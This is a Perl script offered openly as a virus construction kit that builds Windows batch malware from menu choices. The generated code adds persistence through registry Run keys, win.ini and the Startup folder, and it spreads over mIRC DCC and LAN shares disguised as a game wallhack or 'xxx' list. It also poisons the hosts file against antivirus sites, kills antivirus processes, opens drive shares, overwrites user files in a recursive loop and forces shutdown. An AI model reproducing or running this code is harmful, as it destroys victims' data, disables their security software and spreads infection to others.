   #!/usr/local/bin/perl
   # [ digital art by dav ]
   print("*****************************\n");
   print("########     ###    ##     ##\n");
   print("##     ##   ## ##   ##     ##\n");
   print("##     ##  ##   ##  ##     ##\n");
   print("##     ## ##     ## ##     ##\n");
   print("##     ## #########  ##   ##\n");
   print("##     ## ##     ##   ## ##\n");
   print("########  ##     ##    ###\n");
   print("  Perl.dav KIT-B BAT/VIRUS\n");
   print("*****************************\n");
   print("\n");
   print("Virus Name?\n");
    chomp ($vname = <STDIN>);
    print("\n");
   print("Your Name?\n");
    chomp ($vwriter = <STDIN>);
     print("\n");
     open(FH,">$vname.bat");
     print FH '@echo off'. "\n";
     print FH ":: $vname.virus by $vwriter\n:: [ digital art by perl.dav kit-b ]\nset v=$vname\ncopy %0 %windir%\\%v%.bat\n";
     close(FH);
   # Funktionen
   sub fakebytes() {
       open(FH,">>$vname.bat");
       print FH "stjrdnfuqlgmpuwefguowyakzxgkxolraxozihswcfngwkpaolmmyfrzmsxbcnvrmwrtnjpwy\n";
       print FH "zciptpriqzrfqkqwgfiqpivuityndlqmlivmdtkjuynjdxzmpjedfjacsqgybiwcamxxxwolv\n";
       print FH "emlcctvneufmhnvfsutoqnldznssinuqigrxbzyxwfmblnqhxztsokqyldnimzgjsmqwshaso\n";
       print FH "ajbakariwolazvdwhskrdsyqqcjayyqwusubevwumtwysahdzxtqhausneeistduraaaozirc\n";
       print FH "wvqswebffznuymcvqhitlgknfdlwbzdlxfikprozaaxynlxhtmcflbnptelhpgpymekdijonv\n";
       print FH "cqqqtsqfndkcwihitiscoqqsphuooymtkolmjdielrslulfpqodcitauueorvbyohxhmwgfwr\n";
       close(FH);
       }

      sub runtimefakebytes() {
          open(FH,">>$vname.bat");
          print FH "%random%%random%%random%%random%%random%%random%%random%\n";
          print FH "%random%%random%%random%%random%%random%%random%%random%\n";
          print FH "%random%%random%%random%%random%%random%%random%%random%\n";
          print FH "%random%%random%%random%%random%%random%%random%%random%\n";
          print FH "%random%%random%%random%%random%%random%%random%%random%\n";
          print FH "%random%%random%%random%%random%%random%%random%%random%\n";
          close(FH);
           }

   sub fakemsg() {
         open(FH,">>$vname.bat");
         print FH "echo -------------------------------------\n";
         print FH "echo CS:C X Wallhack build 2005\n";
         print FH "echo -------------------------------------\n";
         print FH "echo.\n";
         close(FH);
         }
     sub fakemsg2() {
         open(FH,">>$vname.bat");
         print FH "cls\n";
         print FH "echo -------------------------------------\n";
         print FH "echo install done\n";
         print FH "echo happy fragging ;)\n";
         print FH "echo -------------------------------------\n";
         print FH "pause > nul\n";
         close(FH);

          }
   sub regdumb() {
     open(FH,">>$vname.bat");
     print FH "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v vwin /t REG_SZ /d %windir%\\%v%.bat /f > nul\n";
     print FH "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v vwin /t REG_SZ /d %windir%\\%v%.bat /f > nul\n";
     close(FH); }

   sub winini() {
     open(FH,">>$vname.bat");
     print FH "echo [windows] >> %windir%\\win.ini\n";
     print FH "echo run=%windir%\\%v%.bat >> %windir%\\win.ini\n";
     print FH "echo load=%windir%\\%v%.bat >> %windir%\\win.ini\n";
     close(FH); }

   sub autostart() {
     open(FH,">>$vname.bat");
     print FH "chcp 1252 > nul\n";
     print FH 'copy %0 "C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\Programme\\Autostart\\win.bat" > nul' . "\n";
     print FH 'copy %0 "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\win.bat" > nul' . "\n";
     close(FH); }

   sub winhost() {
     open(FH,">>$vname.bat");
     print FH "set $vwriter=echo\n";
     print FH "%$vwriter% 127.0.0.1 www.google.com > %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.google.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.symantec.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.free-av.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.free-av.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.antivir.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.antivir.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.kaspersky.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.kaspersky.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.microsoft.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.microsoft.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.sophos.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.sophos.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.symantec.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.hijackthis.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.spychecker.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.trendmicro.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.trendmicro.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.lavasoftusa.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.yahoo.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.yahoo.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.lycos.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "%$vwriter% 127.0.0.1 www.lycos.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
     print FH "cls\n";
     close(FH); }

   sub netshare() {
     open(FH,">>$vname.bat");
     print FH "net share c=c:\n";
     print FH "net share g=g:\n";
     print FH "net share f=f:\n";
     print FH "net share x=x:\n";
     close(FH); }

   sub overwrite() {
     open(FH,">>$vname.bat");
     print FH "for %%a in (*.bat *.txt *.doc) do copy %0 %%a > nul\n";
     print FH "for %%a in (*.exe *.ini *.cfg) do copy %0 %%a > nul\n";
     close(FH); }

   sub reboot() {
     open(FH,">>$vname.bat");
     print FH 'shutdown /s /f /t 23 /c ' . '"Infected with ' . $vname . '"' . "\n";
     close(FH); }

   sub mirc() {
     open(FH,">>$vname.bat");
     print FH "set c=echo\n";
     print FH "copy %0 %windir%\\csscheat.bat\n";
     print FH "%c% [script] > irc.bat\n";
     print FH '%c% n1=if ($nick == $me) { halt } >> irc.bat' . "\n";
     print FH '%c% n2=/dcc send $nick "%windir%\\csscheat.bat" >> irc.bat' . "\n";
     print FH "%c% n3=} >> irc.bat\n";
     print FH "if exist c:\\mIRC\\script.ini copy irc.bat c:\\mIRC\\script.ini\n";
     print FH "if exist %programfiles%\\mIRC\\script.ini copy irc.bat %programfiles%\\mIRC\\script.ini\n";
     print FH "del irc.bat > nul\n";
     close(FH); }

   sub lanshare() {
     open(FH,">>$vname.bat");
     print FH "md %programfiles%\\sharex\\xxx\\ > nul\n";
     print FH "md %programfiles%\\sharex\\crackz\\ > nul\n";
     print FH "copy %0 %programfiles%\\sharex\\xxx\\xxxlist.bat > nul\n";
     print FH "copy %0 %programfiles%\\sharex\\crackz\\css_xwallhack.bat > nul\n";
     print FH "echo put the css_xwallhack.bat in your ccs dic and start it, happy fragging :) > %programfiles%\\sharex\\crackz\\cssource_wallhack.txt\n";
     print FH "echo start xxxlist.bat and enjoy ;) > %programfiles%\\sharex\\xxx\\xxxftplist.txt\n";
     print FH "net share xxx&crackz=%programfiles%\\sharex > nul\n";
     close(FH); }

   sub tk() {
     open(FH,">>$vname.bat");
     print FH "set t=tskill\n";
     print FH "%t% norton*\n";
     print FH "%t% av*\n";
     print FH "%t% fire*\n";
     print FH "%t% anti*\n";
     print FH "%t% spy*\n";
     print FH "%t% bullguard\n";
     print FH "%t% PersFw\n";
     print FH "%t% KAV*\n";
     print FH "%t% ZONEALARM\n";
     print FH "%t% SAFEWEB\n";
     print FH "%t% OUTPOST\n";
     print FH "%t% nv*\n";
     print FH "%t% nav*\n";
     print FH "%t% F-*\n";
     print FH "%t% ESAFE\n";
     print FH "%t% cle\n";
     print FH "%t% BLACKICE\n";
     print FH "%t% def*\n";
     close(FH); }

   sub uptrav() {
       open(FH,">>$vname.bat");
       print FH ":travelsub\n";
       print FH "for %%a in (*.*) do copy %0 %%a > nul\n";
       print FH "cd .. > nul\n";
       print FH "goto travelsub\n";
       close(FH); }
   # Menu
   print("*** Some Fake Things ***\nType 1, 2, 3 or 4\n1)Runtime fake bytes\n2)Code fake bytes\n3)Fake message\n4)All\n$vwriter:");
        chomp ($fake = <STDIN>);
        if($fake == 1) {
            runtimefakebytes();
        }
        elsif ($fake == 2) {
            fakebytes();
        }
        elsif ($fake == 3) {
            fakemsg();
        }
        elsif ($fake == 4) {
            runtimefakebytes(); fakebytes(); fakemsg();
        }
        else { print "x\n" }
        print("\n");

   print("*** Virus Startup ***\nType 1, 2 , 3 or 4\n1)Registry dump\n2)Win.ini\n3)Autostart/Startup folder\n4)All\n$vwriter:");
        chomp ($start = <STDIN>);
        if($start == 1) {
            regdumb();
        }
        elsif ($start == 2) {
            winini();
        }
        elsif ($start == 3) {
           autostart();
        }
        elsif ($start == 4) {
             regdumb(); winini(); autostart();
        }
        else { print "x\n" }
        print("\n");

   print("*** Virus - WormFunctions ***\nType 1, 2 or 3\n1)mIRC spreading\n2)LAN spreading\n3)Both\n$vwriter:");
        chomp ($spread = <STDIN>);
        if($spread == 1) {
            mirc();
        }
        elsif ($spread == 2) {
            lanshare();
        }
        elsif ($spread == 3) {
           mirc(); lanshare();
       }
        else { print "x\n" }
        print("\n");

   print("*** Virus Main Function ***\nType 1, 2 , 3, or 4\n1)Infect win hosts file\n2)Open hard disks\n3)Overwrite some files\n4)All\n$vwriter:");
        chomp ($main = <STDIN>);
        if($main == 1) {
            winhost();
        }
        elsif ($main == 2) {
            netshare();
        }
        elsif ($main == 3) {
           overwrite();
        }
        elsif ($main == 4) {
            winhost(); netshare(); overwrite();
        }
        else { print "x\n" }
        print("\n");

   print("*** Virus Main Function 2 ***\nType 1, 2, 3 or 4\n1)Kill Antivirus software\n2)Shutdown with comment\n3)AV Kill and Shutdown only\n4)Overwrite all files (endless&uptrav)\n$vwriter:");
        chomp ($main2 = <STDIN>);
        if($main2 == 1) {
            tk();
        }
        elsif ($main2 == 2) {
            reboot();
        }
        elsif ($main2 == 3) {
           tk(); reboot();
        }
        elsif ($main2 == 4) {
            uptrav();
        }
        else { print "x\n" }
        print("\n");

   if($fake == 3 || $fake == 4) { fakemsg2(); }

   open(FH,">>$vname.bat");
        print FH ":: [ fuck us gov ]\n";
        print FH "exit\n";
        close(FH);
        while ($cya ne 'exit') {
        print "*** $vname.BAT BUILT ***\n";
        print "*** I AM NOT RESPONSIBLE FOR POSSIBLE DAMAGES OR SOMETHING ELSE. ***\n";
        print "*** exit to quit ***\n";
        chomp ($cya = <STDIN>);
        print "\n"; }
